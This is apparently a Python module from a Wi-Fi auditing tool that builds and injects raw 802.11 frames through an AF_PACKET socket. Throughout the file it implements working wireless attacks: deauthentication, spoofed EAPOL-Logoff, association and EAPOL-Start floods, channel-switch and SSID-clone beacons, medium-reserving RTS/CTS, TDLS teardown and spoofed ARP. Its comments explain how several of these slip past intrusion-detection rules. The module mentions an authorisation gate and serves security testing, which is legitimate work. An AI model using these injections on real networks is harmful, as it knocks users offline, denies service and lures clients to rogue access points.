"""Raw frame injection: the frames no external tool sends for us.

wifipilot's attacks normally drive the aircrack-ng suite, because those tools are
battle-tested and their output is what an operator already trusts.  A few techniques
exist that no packaged tool implements cleanly, and this module builds exactly those
frames and hands them to the kernel:

* **EAPOL-Logoff** (``build_eapol_logoff``) — a supplicant is supposed to accept an
  EAPOL-Logoff from its authenticator without any cryptographic check, so an AP-shaped
  frame with the client's MAC as the source disconnects it.  It is the quiet cousin of
  a deauthentication frame: many WIDS rule sets key on deauth frames specifically, and
  a Logoff often lands where a deauth does not.  Unlike a deauth, it does nothing if
  802.11w is required, because it is not a management frame.
* **Deauthentication / disassociation** (``build_deauth``) — the same frame
  ``aireplay-ng --deauth`` sends, built here so targeted single-frame tests do not
  need a second tool.

Both are transmitted through ``AF_PACKET`` on a monitor interface, which is why every
caller is gated twice: the authorisation prompt (an attack that injects refuses to run
without it) and ``Config.stealth`` (which turns transmission off entirely).  The
sender is deliberately dumb — one frame, one ``sendto`` — so nothing here can turn
into a flood by accident; the flood attacks use mdk4, which has rate control.
"""

from __future__ import annotations

import os
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .pcap import (SUBTYPE_ACTION, SUBTYPE_ASSOC_REQ, SUBTYPE_ASSOC_RESP, SUBTYPE_ATIM,
                   SUBTYPE_AUTH, SUBTYPE_BEACON, SUBTYPE_DEAUTH, SUBTYPE_DISASSOC,
                   SUBTYPE_PROBE_REQ, SUBTYPE_PROBE_RESP, SUBTYPE_REASSOC_REQ)
from .util import mac_norm

__all__ = ["RADIOTAP", "build_radiotap", "EAPOL_LOGOFF", "build_eapol_logoff",
           "build_deauth", "build_qos_eapol", "RawInjector", "injection_available",
           "header_offset", "frame_only", "describe", "eapol_logoff_burst",
           "ETHERTYPE_EAPOL", "SUBTYPE_NAMES",
           # the second wave: state-exhaustion, spoofing and lure frames
           "build_auth_request", "build_assoc_request", "build_reassoc_request",
           "build_null_data", "build_eapol_start", "build_probe_request",
           "build_csa_beacon", "build_probe_response", "build_arp_request", "build_arp_reply", "build_ssid_confusion_beacon",
           "spoofed_mac", "DATA_SUBTYPES", "DATA_NAMES",
           # the third wave: control frames, action frames and injected L3 payloads
           "ACTION_NAMES", "ACTION_RADIO_MEASUREMENT", "ACTION_SA_QUERY", "ACTION_TDLS",
           "ACTION_UNPROTECTED_WNM", "CTRL_ACK", "CTRL_CTS", "CTRL_RTS",
           "build_action", "build_beacon_frame", "build_btm_request", "build_cts",
           "build_data", "build_disassoc", "build_rm_beacon_request", "build_rts",
           "build_sa_query", "build_tdls_teardown", "action_name"]

ETHERTYPE_EAPOL = 0x888E

#: EAPOL packet types (802.1X-2010 table 11-3)
EAPOL_EAP_PACKET, EAPOL_START, EAPOL_LOGOFF, EAPOL_KEY, EAPOL_ENCAPSULATED_ASF = \
    0, 1, 2, 3, 4

#: LLC/SNAP header with the EAPOL ethertype: every EAPOL frame starts like this
LLC_SNAP_EAPOL = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"

SUBTYPE_NAMES = {
    SUBTYPE_ASSOC_REQ: "association request", SUBTYPE_ASSOC_RESP: "association response",
    SUBTYPE_REASSOC_REQ: "reassociation request", SUBTYPE_PROBE_REQ: "probe request",
    SUBTYPE_PROBE_RESP: "probe response", SUBTYPE_BEACON: "beacon",
    SUBTYPE_ATIM: "ATIM", SUBTYPE_DISASSOC: "disassociation", SUBTYPE_AUTH: "authentication",
    SUBTYPE_DEAUTH: "deauthentication", SUBTYPE_ACTION: "action",
}

#: EAPOL packet types, named: "EAPOL" on its own tells an operator nothing, and the
#: difference between a Key frame and a Logoff is the whole attack
EAPOL_TYPE_NAMES = {EAPOL_EAP_PACKET: "EAPOL-EAP", EAPOL_START: "EAPOL-Start",
                    EAPOL_LOGOFF: "EAPOL-Logoff", EAPOL_KEY: "EAPOL-Key",
                    EAPOL_ENCAPSULATED_ASF: "EAPOL-ASF"}

#: a minimal radiotap header: version 0, no present flags, length 8
RADIOTAP = b"\x00\x00\x08\x00\x00\x00\x00\x00"
#: the same header plus a rate field (500 kb/s units) — some drivers want the rate
#: the frame is transmitted at, and 2 Mb/s is what a management frame uses
_RADIOTAP_RATE = b"\x00\x00\x09\x00\x02\x00\x00\x00\x04"


def build_radiotap(rate: int = 0) -> bytes:
    """A radiotap header, optionally with a transmit rate in 500 kb/s units."""
    if rate:
        return b"\x00\x00\x09\x00\x02\x00\x00\x00" + bytes([rate & 0xFF])
    return RADIOTAP


def _mac_bytes(mac: str) -> bytes:
    clean = mac_norm(mac)
    if not clean:
        raise ValueError(f"not a MAC address: {mac!r}")
    return bytes(int(part, 16) for part in clean.split(":"))


#: frame-control bits: protocol version (0-1), type (2-3), subtype (4-7)
FC_MGMT, FC_DATA = 0, 2
FC_FROM_DS, FC_TO_DS = 0x02, 0x01
FC_QOS_DATA = 0x08


def frame_control(frame_type: int, subtype: int, flags: int = 0) -> int:
    """Pack the first frame-control byte (type/subtype) and return both bytes."""
    return (((frame_type & 0x03) << 2) | ((subtype & 0x0F) << 4), flags & 0xFF)


def _mgmt_header(subtype: int, addr1: str, addr2: str, addr3: str) -> bytes:
    """A 24-byte management header: frame control, duration, three addresses, seq."""
    control, flags = frame_control(FC_MGMT, subtype)
    return (struct.pack("<BB", control, flags) + b"\x00\x00"
            + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3)
            + b"\x00\x00")


def build_deauth(bssid: str, client: str = "ff:ff:ff:ff:ff:ff", reason: int = 7,
                 disassociate: bool = False, station_is_source: bool = False) -> bytes:
    """A deauthentication (or disassociation) frame, with a radiotap header.

    ``station_is_source`` builds the *client-spoofed* variant of the classic
    "deauth the client from itself": address 2 (the transmitter) is the station, so
    an AP that validates the transmitter address still processes it.  Both variants
    are used in the field; neither is authenticated unless 802.11w is in force.
    """
    subtype = SUBTYPE_DISASSOC if disassociate else SUBTYPE_DEAUTH
    if station_is_source:
        header = _mgmt_header(subtype, bssid, client, bssid)
    else:
        header = _mgmt_header(subtype, client, bssid, bssid)
    body = struct.pack("<H", max(0, min(65535, int(reason))))[:2]
    return build_radiotap(rate=2) + header + body


def build_eapol_logoff(bssid: str, client: str,
                       version: int = 1) -> bytes:
    """An EAPOL-Logoff frame, addressed to the client as if the AP sent it.

    The frame is three fields long — version, type, length — and carries no
    cryptographic material, because the original 802.1X design has no way to
    authenticate a Logoff.  That is the whole attack: an unauthenticated frame that
    makes a supplicant tear down its session.
    """
    return _data_eapol(bssid, client, EAPOL_LOGOFF, version=version, qos=False)


def build_qos_eapol(bssid: str, client: str, payload_type: int = EAPOL_LOGOFF,
                    version: int = 1) -> bytes:
    """The QoS-data variant of an EAPOL frame (the WMM/WDS shape clients see).

    Most modern clients negotiate WMM, and some drivers drop un-QoS'd data frames
    addressed to an associated station, so the logoff attack sends both shapes.
    """
    return _data_eapol(bssid, client, payload_type, version=version, qos=True)


def _data_eapol(bssid: str, client: str, payload_type: int, version: int = 1,
                qos: bool = False) -> bytes:
    """One EAPOL frame in a data (or QoS-data) envelope, AP -> client."""
    body = (LLC_SNAP_EAPOL + bytes([version & 0x03, payload_type & 0xFF]) + b"\x00\x00")
    # from the AP to the client: FromDS, addr1 = client, addr2 = BSSID, addr3 = SA
    control, flags = frame_control(FC_DATA, 0x08 if qos else 0x00, FC_FROM_DS)
    header = (struct.pack("<BB", control, flags)
              + b"\x00\x00" + _mac_bytes(client) + _mac_bytes(bssid)
              + _mac_bytes(bssid) + b"\x00\x00")
    if qos:
        header += b"\x00\x00"                      # QoS control: TID 0, normal ack
    return build_radiotap(rate=2) + header + body


# --------------------------------------------------------------------------- #
# the second wave: frames for the state-exhaustion and spoofing attacks
# --------------------------------------------------------------------------- #

#: data-frame subtypes this module builds (frame control type 2)
DATA_SUBTYPES = {"data": 0x00, "null": 0x04, "qos_data": 0x08, "qos_null": 0x0C}

#: data-frame subtype -> the name ``describe`` prints.  A null-data flood is not
#: "data" in a report: the frame's whole purpose is the bit it does *not* carry.
DATA_NAMES = {0x00: "data", 0x04: "null data (power save)",
              0x08: "QoS data", 0x0C: "QoS null data (power save)"}


def build_auth_request(bssid: str, client: str, sequence: int = 1,
                       algorithm: int = 0, status: int = 0) -> bytes:
    """An open-system authentication request (``seq`` 1) or response.

    ``auth_flood`` sends these from randomised addresses; a single one is also the
    first step of a fake authentication, which is where ``ap_isolation_audit`` and the
    WEP injection attacks get their association state from.
    """
    header = _mgmt_header(SUBTYPE_AUTH, bssid, client, bssid)
    body = struct.pack("<HHH", algorithm & 0xFFFF, max(1, int(sequence)) & 0xFFFF,
                       status & 0xFFFF)
    return build_radiotap(rate=2) + header + body


def _ies(pairs: "Sequence[Tuple[int, bytes]]") -> bytes:
    return b"".join(bytes([tag & 0xFF, len(value) & 0xFF]) + value
                    for tag, value in pairs)


def build_assoc_request(bssid: str, client: str, ssid: str = "",
                        capability: int = 0x0431, listen_interval: int = 1,
                        extra_ies: bytes = b"") -> bytes:
    """An association request, the frame that fills an AP's association table.

    ``assoc_flood`` sends one per fake station: unlike an authentication flood, the AP
    has to allocate and hold state for each of them, which is why the *association*
    table is the resource a state-exhaustion attack actually exhausts.
    """
    header = _mgmt_header(SUBTYPE_ASSOC_REQ, bssid, client, bssid)
    name = ssid.encode("utf-8", "replace")[:32]
    payload = (struct.pack("<HH", capability & 0xFFFF, listen_interval & 0xFFFF)
               + _ies([(0, name), (1, b"\x82\x84\x8b\x96\x0c\x12\x18\x24")])
               + extra_ies)
    return build_radiotap(rate=2) + header + payload


def build_reassoc_request(bssid: str, client: str, current_bssid: str = "",
                          ssid: str = "", capability: int = 0x0431) -> bytes:
    """A reassociation request (used by the reassociation half of the assoc flood)."""
    header = _mgmt_header(SUBTYPE_REASSOC_REQ, bssid, client, bssid)
    name = ssid.encode("utf-8", "replace")[:32]
    payload = (struct.pack("<HH", capability & 0xFFFF, 1)
               + _mac_bytes(current_bssid or bssid)
               + _ies([(0, name)])
               + b"\x00\x00")
    return build_radiotap(rate=2) + header + payload


def build_null_data(bssid: str, client: str, qos: bool = True, tid: int = 0,
                    from_client: bool = True, power_save: bool = False) -> bytes:
    """A (QoS) Null data frame.

    Null data carries no payload: its only job is to make the *power-management* bit
    travel, so an AP that believes a client is awake or asleep for long enough drops
    its state and deauthenticates it.  The trick is that no deauthentication frame is
    ever sent, which is exactly why a WIDS that counts deauth frames does not see it.
    """
    flags = FC_FROM_DS
    if from_client:
        flags = FC_TO_DS
        addr1, addr2, addr3 = bssid, client, bssid
    else:
        addr1, addr2, addr3 = client, bssid, bssid
    subtype = DATA_SUBTYPES["qos_null"] if qos else DATA_SUBTYPES["null"]
    control, control_flags = frame_control(FC_DATA, subtype, flags)
    if power_save:
        control_flags |= 0x10                 # the PS bit is the whole point of the frame
    header = (struct.pack("<BB", control, control_flags) + b"\x00\x00"
              + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3)
              + b"\x00\x00")
    if qos:
        header += struct.pack("<H", (tid & 0x0F) | 0x10)     # ack policy: normal
    return build_radiotap(rate=2) + header


def build_eapol_start(bssid: str, client: str, version: int = 1) -> bytes:
    """An EAPOL-Start: "I am here, begin 802.1X".

    Flooding these from fake supplicant addresses makes an authenticator open and hold
    EAP sessions it cannot finish, which is the 802.1X analogue of the authentication
    flood and the reason RADIUS servers fall over before access points do.
    """
    body = (LLC_SNAP_EAPOL + bytes([version & 0x03, EAPOL_START]) + b"\x00\x00")
    control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_TO_DS)
    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
              + _mac_bytes(bssid) + _mac_bytes(client) + _mac_bytes(bssid)
              + b"\x00\x00")
    return build_radiotap(rate=2) + header + body


def build_probe_request(station: str, ssid: str = "", rates: bytes = b"\x82\x84\x8b\x96",
                        bssid: str = "ff:ff:ff:ff:ff:ff") -> bytes:
    """A probe request, directed at one SSID (or wildcard when ``ssid`` is empty)."""
    header = _mgmt_header(SUBTYPE_PROBE_REQ, bssid, station, bssid)
    name = ssid.encode("utf-8", "replace")[:32]
    return build_radiotap(rate=2) + header + _ies([(0, name), (1, rates)])


def build_probe_response(station: str, bssid: str, ssid: str = "", channel: int = 6,
                         include_rsn: bool = True) -> bytes:
    """A probe response — the frame a *Karma* device answers everything with.

    Directed at one station, this is the second half of the "who is lying" test: send
    a probe request for a name that cannot exist and see which transmitter is
    impolite enough to answer it.
    """
    header = _mgmt_header(SUBTYPE_PROBE_RESP, station, bssid, bssid)
    body = (b"\x00" * 8 + struct.pack("<H", 100) + struct.pack("<H", 0x0431))
    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
           (1, b"\x82\x84\x8b\x96"),
           (3, bytes([channel & 0xFF]))]
    if include_rsn:
        ies.append((48, b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04"
                        b"\x01\x00\x00\x0f\xac\x02"))
    return build_radiotap(rate=2) + header + body + _ies(ies)


def build_csa_beacon(bssid: str, ssid: str, channel: int = 6, new_channel: int = 1,
                     count: int = 1, switch_mode: int = 1, capability: int = 0x0431,
                     include_rsn: bool = False) -> bytes:
    """A beacon carrying a Channel Switch Announcement (CSA) element.

    The CSA element is how a real AP tells its clients "move to channel N now".  It is
    a plain management frame, so any transmitter can send it, and clients that follow it
    leave the network they were on — no deauth frame, and nothing in the log of a WIDS
    that only counts disconnects.
    """
    header = _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid)
    body = (b"\x00" * 8 + struct.pack("<H", capability & 0xFFFF)
            + struct.pack("<H", 100) + b"\x00" * 6)         # timestamp, beacon interval
    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
           (1, b"\x82\x84\x8b\x96"),
           (3, bytes([channel & 0xFF])),
           (37, bytes([switch_mode & 0xFF, (new_channel or 1) & 0xFF,
                       max(0, int(count)) & 0xFF]))]
    if include_rsn:
        ies.append((48, b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04"
                        b"\x01\x00\x00\x0f\xac\x02"))
    return build_radiotap(rate=2) + header + body + _ies(ies)


def build_ssid_confusion_beacon(bssid: str, ssid: str, channel: int = 6,
                                capability: int = 0x0431) -> bytes:
    """A beacon for an existing SSID sent from a different BSSID.

    Clients that remember a network by name alone will try to associate with this
    transmitter, which is how an attacker harvests credentials or simply steals
    clients from the real AP.  Nothing about the frame is authenticated.
    """
    header = _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid)
    body = (b"\x00" * 8 + struct.pack("<H", capability & 0xFFFF) + struct.pack("<H", 100)
            + b"\x00" * 6)
    ies = [(0, ssid.encode("utf-8", "replace")[:32]),
           (1, b"\x82\x84\x8b\x96"),
           (3, bytes([channel & 0xFF]))]
    return build_radiotap(rate=2) + header + body + _ies(ies)


def _arp_frame(sender_mac: str, sender_ip: str, target_mac: str, target_ip: str,
               opcode: int, bssid: str, dst: bytes, from_client: bool) -> bytes:
    """The shared half of the two ARP builders: LLC/SNAP + ARP payload + data header."""
    # ARP is a network-order protocol: hardware type, protocol type and opcode are
    # all big-endian (a little-endian opcode makes the frame a 0x0200 "unknown" op,
    # which every stack drops without a word)
    arp = (b"\x00\x01" + b"\x08\x00" + b"\x06" + b"\x04"
           + struct.pack(">H", opcode & 0xFFFF)
           + _mac_bytes(sender_mac) + socket.inet_aton(sender_ip)
           + _mac_bytes(target_mac) + socket.inet_aton(target_ip))
    payload = b"\xaa\xaa\x03\x00\x00\x00\x08\x06" + arp
    if from_client:
        control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_TO_DS)
        addr1, addr2, addr3 = bssid, sender_mac, bssid
    else:                                          # the AP relays it back to a station
        control, flags = frame_control(FC_DATA, DATA_SUBTYPES["data"], FC_FROM_DS)
        addr1, addr2, addr3 = target_mac, bssid, sender_mac
    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
              + _mac_bytes(addr1) + _mac_bytes(addr2) + _mac_bytes(addr3) + b"\x00\x00")
    return build_radiotap(rate=2) + header + payload


def build_arp_request(sender_mac: str, sender_ip: str, target_ip: str,
                      bssid: str = "", broadcast: bool = True) -> bytes:
    """An ARP request from a spoofed station, for the client-isolation test.

    Sent to the AP with a *victim's* MAC as the source, a reply means the AP forwards
    frames between its clients — which is what client isolation is supposed to stop.
    """
    from .util import mac_norm as _norm

    target_mac = "ff:ff:ff:ff:ff:ff" if broadcast else _norm(sender_mac)
    return _arp_frame(sender_mac, sender_ip, target_mac, target_ip, 1,
                      bssid or "ff:ff:ff:ff:ff:ff",
                      b"" if broadcast else _mac_bytes(target_mac), from_client=True)


def build_arp_reply(sender_mac: str, sender_ip: str, target_mac: str,
                    target_ip: str, bssid: str = "") -> bytes:
    """An ARP reply *from a station* — what the isolation test hopes the AP relays."""
    return _arp_frame(sender_mac, sender_ip, target_mac, target_ip, 2, bssid,
                      _mac_bytes(target_mac), from_client=True)


# --------------------------------------------------------------------------- #
# the third wave: control frames, action frames and L2 payloads
# --------------------------------------------------------------------------- #

#: control-frame subtypes we build (802.11-2020 table 9-1)
CTRL_RTS, CTRL_CTS, CTRL_ACK = 11, 12, 13

#: action-frame categories that matter to the attacks here
ACTION_SPECTRUM_MGMT, ACTION_QOS, ACTION_DLS, ACTION_BLOCK_ACK, ACTION_RADIO_MEASUREMENT = \
    0, 1, 2, 3, 5
ACTION_FAST_BSS_TRANSITION, ACTION_SA_QUERY = 6, 8
ACTION_UNPROTECTED_WNM, ACTION_PROTECTED_WNM, ACTION_TDLS = 9, 10, 12

ACTION_NAMES = {
    (ACTION_RADIO_MEASUREMENT, 0): "radio measurement request",
    (ACTION_RADIO_MEASUREMENT, 5): "beacon request",
    (ACTION_SA_QUERY, 0): "SA Query request",
    (ACTION_SA_QUERY, 1): "SA Query response",
    (ACTION_TDLS, 0): "TDLS teardown",
    (ACTION_UNPROTECTED_WNM, 7): "BSS transition management request",
    (ACTION_PROTECTED_WNM, 7): "protected BTM request",
}


def build_disassoc(bssid: str, client: str = "ff:ff:ff:ff:ff:ff", reason: int = 8,
                   station_is_source: bool = False) -> bytes:
    """A disassociation frame — the sibling of a deauth, and not always filtered."""
    return build_deauth(bssid, client, reason=reason, disassociate=True,
                        station_is_source=station_is_source)


def build_rts(transmitter: str, receiver: str = "ff:ff:ff:ff:ff:ff",
              duration: int = 32767) -> bytes:
    """A request-to-send frame whose duration field reserves the medium (a NAV attack).

    Control frames have no addresses beyond receiver/transmitter and no sequence
    number: 10 bytes of header and a frame-check sequence.
    """
    control, flags = frame_control(1, CTRL_RTS)
    return (RADIOTAP + struct.pack("<BBH", control, flags, duration & 0x7FFF)
            + _mac_bytes(receiver) + _mac_bytes(transmitter))


def build_cts(receiver: str = "ff:ff:ff:ff:ff:ff", duration: int = 32767) -> bytes:
    """A CTS-to-self frame with a long duration: the quietest way to hold the medium."""
    control, flags = frame_control(1, CTRL_CTS)
    return (RADIOTAP + struct.pack("<BBH", control, flags, duration & 0x7FFF)
            + _mac_bytes(receiver))


def build_action(bssid: str, client: str, category: int, action: int,
                 payload: bytes = b"", protected: bool = False,
                 station_is_source: bool = False, token: int = 0) -> bytes:
    """A management *action* frame: the carrier for SA Query, TDLS, RRM and WNM.

    ``protected`` sets the Protected Frame bit, which is how the SA Query frames of a
    PMF-capable AP look; the payload is built by the callers below.
    """
    transmitter = client if station_is_source else bssid
    receiver = bssid if station_is_source else client
    control, flags = frame_control(FC_MGMT, SUBTYPE_ACTION)
    if protected:
        flags |= 0x40
    header = (struct.pack("<BB", control, flags) + b"\x00\x00"
              + _mac_bytes(receiver) + _mac_bytes(transmitter) + _mac_bytes(bssid)
              + b"\x00\x00")
    return RADIOTAP + header + bytes([category, action]) + payload


def build_sa_query(bssid: str, client: str, token: int = 0, response: bool = False,
                   protected: bool = True) -> bytes:
    """An SA Query action frame: the association-security check 802.11w defines."""
    return build_action(bssid, client, ACTION_SA_QUERY, 1 if response else 0,
                        payload=struct.pack("<H", token & 0xFFFF), protected=protected)


def build_tdls_teardown(bssid: str, client: str, peer: str = "",
                        reason: int = 3) -> bytes:
    """TDLS Teardown: asks a station to drop a direct link (category 12, action 0)."""
    peer_mac = peer or bssid
    payload = _mac_bytes(peer_mac) + bytes([reason & 0xFF])
    return build_action(bssid, client, ACTION_TDLS, 0, payload=payload)


def build_rm_beacon_request(bssid: str, client: str, channel: int = 0,
                            regulatory_class: int = 81, duration: int = 100,
                            mode: int = 0, measurement_bssid: str = "") -> bytes:
    """An 802.11k Beacon Request: a station is asked to report beacons for a channel."""
    payload = (bytes([regulatory_class & 0xFF, channel & 0xFF])
               + struct.pack("<H", 0)                       # randomisation interval
               + struct.pack("<H", duration & 0xFFFF)
               + bytes([mode & 0xFF])
               + _mac_bytes(measurement_bssid or "ff:ff:ff:ff:ff:ff"))
    return build_action(bssid, client, ACTION_RADIO_MEASUREMENT, 5, payload=payload)


def build_btm_request(bssid: str, client: str, candidates: Sequence[Tuple[str, int, int]] = (),
                      dialog_token: int = 1, disassociation_timer: int = 0,
                      validity: int = 60, mode: int = 0) -> bytes:
    """A BSS Transition Management Request with a neighbour-report element.

    ``candidates`` is ``(bssid, channel, operating_class)``: the APs a client is told
    to consider.  A station that follows our candidate list to an AP that is not there
    is the 802.11v twin problem, and that is what the attack measures.
    """
    payload = (bytes([dialog_token & 0xFF, mode & 0xFF])
               + struct.pack("<H", disassociation_timer & 0xFFFF)
               + bytes([validity & 0xFF]))
    neighbours = b""
    for candidate, channel, opclass in candidates:
        # neighbour report entry: BSSID(6) + BSSID info(4) + opclass(1) + channel(1)
        # + PHY type(1) = 13 bytes, the stride every parser (ours included) walks
        neighbours += (_mac_bytes(candidate) + b"\x00\x00\x00\x00"
                       + bytes([opclass & 0xFF, channel & 0xFF, 0x00]))
    if neighbours:
        payload += bytes([52]) + bytes([len(neighbours) + 1]) + bytes([0]) + neighbours
    return build_action(bssid, client, ACTION_UNPROTECTED_WNM, 7, payload=payload)


def build_beacon_frame(bssid: str, ssid: str, channel: int = 6, interval: int = 100,
                       capability: int = 0x0411, extra_ies: bytes = b"",
                       rsn: bytes = b"") -> bytes:
    """A full beacon, with the BSSID given: the clone case is the reason it exists.

    ``build_csa_beacon`` sends a channel switch from a *valid* BSSID; this one can put
    any BSSID behind any SSID, which is what ``beacon_clone`` measures the reaction to.
    """
    body = (b"\x00" * 8 + struct.pack("<H", interval & 0xFFFF)
            + struct.pack("<H", capability & 0xFFFF))
    body += _ies([(0, ssid.encode()[:32]), (1, b"\x82\x84\x8b\x96"),
                  (3, bytes([channel & 0xFF])), (5, b"\x01\x00")])
    if rsn:
        body += _ies([(48, rsn)])
    body += extra_ies
    return RADIOTAP + _mgmt_header(SUBTYPE_BEACON, "ff:ff:ff:ff:ff:ff", bssid, bssid) + body


def build_data(bssid: str, client: str, payload: bytes, ethertype: int = 0x0800,
               to_ds: bool = False, from_ds: bool = True, qos: bool = False,
               tid: int = 0, protected: bool = False) -> bytes:
    """An 802.11 data frame carrying an L3 payload (LLC/SNAP + ethertype + payload).

    With ``from_ds`` the frame looks like it came *from* the AP to the client, which is
    how a rogue DHCP/DNS/RADIUS server's traffic has to look when it is injected rather
    than sent by hostapd.
    """
    flags = 0
    if to_ds:
        flags |= FC_TO_DS
    if from_ds:
        flags |= FC_FROM_DS
    if protected:
        flags |= 0x40
    control, _ = frame_control(FC_DATA, 0x08 if qos else 0x00)
    if to_ds and not from_ds:                     # client -> AP
        header = (struct.pack("<BBH", control, flags | FC_TO_DS, 0)
                  + _mac_bytes(bssid) + _mac_bytes(client) + _mac_bytes("ff:ff:ff:ff:ff:ff"))
    elif from_ds and not to_ds:                   # AP -> client
        header = (struct.pack("<BBH", control, flags | FC_FROM_DS, 0)
                  + _mac_bytes(client) + _mac_bytes(bssid) + _mac_bytes(bssid))
    else:                                         # ad-hoc / DS-to-DS
        header = (struct.pack("<BBH", control, flags, 0)
                  + _mac_bytes(client) + _mac_bytes(bssid) + _mac_bytes(bssid))
    if qos:
        header += struct.pack("<H", tid & 0x0F)
    snap = b"\xaa\xaa\x03\x00\x00\x00" + struct.pack(">H", ethertype & 0xFFFF)
    return RADIOTAP + header + snap + payload


def spoofed_mac(seed: int, locally_administered: bool = True) -> str:
    """A deterministic fake station address, for the state-exhaustion attacks.

    Locally-administered by default: a flood of millions of real vendor prefixes would
    look like the neighbourhood, and a report is easier to read when the fake stations
    are obviously fake.
    """
    value = (seed * 2654435761) & 0xFFFFFFFFFFFF
    octets = [(value >> (8 * i)) & 0xFF for i in range(6)][::-1]
    if locally_administered:
        octets[0] = (octets[0] | 0x02) & 0xFE
    else:                                     # pragma: no cover - kept for completeness
        octets[0] &= 0xFC
    return ":".join(f"{octet:02x}" for octet in octets)


def injection_available(interface: str) -> bool:
    """Can we open an ``AF_PACKET`` socket on this interface?  (Linux, CAP_NET_RAW.)"""
    if not interface or not os.path.exists(f"/sys/class/net/{interface}"):
        return False
    if os.geteuid() != 0:                     # AF_PACKET needs CAP_NET_RAW
        return False
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
        try:
            sock.bind((interface, 0))
        finally:
            sock.close()
    except OSError:
        return False
    return True


@dataclass
class InjectionResult:
    """What a transmit attempt actually did."""

    sent: int = 0
    failed: int = 0
    interface: str = ""
    error: str = ""
    started: float = field(default_factory=time.time)

    @property
    def ok(self) -> bool:
        return self.sent > 0 and not self.error

    @property
    def duration(self) -> float:
        return max(0.0, time.time() - self.started)

    def to_dict(self) -> Dict[str, Any]:
        return {"sent": self.sent, "failed": self.failed, "interface": self.interface,
                "error": self.error, "ok": self.ok, "seconds": round(self.duration, 2)}


class RawInjector:
    """Send pre-built frames on a monitor interface.

    Deliberately small: it opens one ``AF_PACKET`` socket, sends the frames it is
    given, and closes it.  Rate limiting is the caller's business, because the
    caller is the only one that knows whether it is sending one frame or a test.
    """

    def __init__(self, interface: str, rate_limit: float = 0.0) -> None:
        self.interface = interface
        self.rate_limit = max(0.0, rate_limit)
        self.result = InjectionResult(interface=interface)
        self._sock: Optional[socket.socket] = None

    # ---------------------------------------------------------------- #
    def open(self) -> bool:
        if self._sock is not None:
            return True
        if not self.interface:
            self.result.error = "no interface to inject on"
            return False
        if not os.path.exists(f"/sys/class/net/{self.interface}"):
            self.result.error = f"{self.interface} does not exist"
            return False
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
            self._sock.bind((self.interface, 0))
        except OSError as exc:
            self._sock = None
            self.result.error = (f"cannot open AF_PACKET on {self.interface}: {exc} "
                                 f"(need root/CAP_NET_RAW and a monitor interface)")
            return False
        return True

    def send(self, frames: Sequence[bytes]) -> InjectionResult:
        """Send every frame, counting successes and failures."""
        if not self.open():
            return self.result
        assert self._sock is not None
        last = 0.0
        for frame in frames:
            if self.rate_limit:
                wait = self.rate_limit - (time.time() - last)
                if wait > 0:
                    time.sleep(wait)
            last = time.time()
            try:
                self._sock.send(frame)
                self.result.sent += 1
            except OSError as exc:
                self.result.failed += 1
                self.result.error = str(exc)
                if self.result.failed >= 5:
                    break
        return self.result

    def close(self) -> None:
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:                       # pragma: no cover
                pass
            self._sock = None

    def __enter__(self) -> "RawInjector":
        self.open()
        return self

    def __exit__(self, *exc_info: Any) -> None:
        self.close()


def frame_only(frame: bytes) -> bytes:
    """The 802.11 frame from a built frame (radiotap header removed).

    Useful for tests and for writing a pcap: ``pcap``/``synth.write_pcap`` add their
    own radiotap header, so a built frame must be stripped before it goes in.
    """
    return frame[header_offset(frame):]


def eapol_logoff_burst(bssid: str, client: str, count: int = 3,
                       interval: float = 0.05, qos: bool = False) -> List[bytes]:
    """The frames a logoff attempt sends, both shapes, for one client."""
    build = build_qos_eapol if qos else build_eapol_logoff
    return [build(bssid, client) for _ in range(max(1, int(count)))]


def header_offset(frame: bytes) -> int:
    """Where the 802.11 header starts: the radiotap header's own length field."""
    if len(frame) < 4:
        return 0
    return struct.unpack_from("<H", frame, 2)[0]


def action_name(category: int, action: int) -> str:
    """The printed name of an action-frame (category, action) pair."""
    return ACTION_NAMES.get((category, action), f"action {category}/{action}")


def describe(frames: Sequence[bytes]) -> List[Tuple[str, int]]:
    """``(kind, length)`` for a list of built frames — used by the CLI and the UI."""
    out: List[Tuple[str, int]] = []
    for frame in frames:
        offset = header_offset(frame)
        if len(frame) <= offset:
            out.append(("truncated", len(frame)))
            continue
        control = frame[offset]
        ftype = (control >> 2) & 0x03
        subtype = (control >> 4) & 0x0F
        if ftype == 1:
            kind = {CTRL_RTS: "RTS (NAV reservation)", CTRL_CTS: "CTS-to-self (NAV)",
                    CTRL_ACK: "ACK"}.get(subtype, f"control subtype {subtype}")
        elif ftype == 2:
            kind = DATA_NAMES.get(subtype, "data")
            base = frame.find(LLC_SNAP_EAPOL, offset)
            if base >= 0:
                version_at = base + len(LLC_SNAP_EAPOL)
                packet_type = frame[version_at + 1] if version_at + 1 < len(frame) else -1
                kind = EAPOL_TYPE_NAMES.get(packet_type, "EAPOL")
        elif subtype == SUBTYPE_ACTION and offset + 25 < len(frame):
            kind = action_name(frame[offset + 24], frame[offset + 25])
        else:
            kind = SUBTYPE_NAMES.get(subtype, f"subtype {subtype}")
        out.append((kind, len(frame)))
    return out
